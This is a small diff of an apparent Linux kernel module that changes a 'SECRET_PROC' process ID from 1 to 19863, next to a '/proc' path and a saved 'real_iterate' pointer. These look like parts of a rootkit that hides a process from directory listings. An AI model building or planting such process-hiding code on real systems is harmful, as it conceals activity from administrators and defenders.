@@ -32,7 +32,7 @@
 MODULE_LICENSE("GPL");
 
 # define ROOT_PATH "/proc"
-# define SECRET_PROC 1
+# define SECRET_PROC 19863
 
 int
 (*real_iterate)(struct file *filp, struct dir_context *ctx);
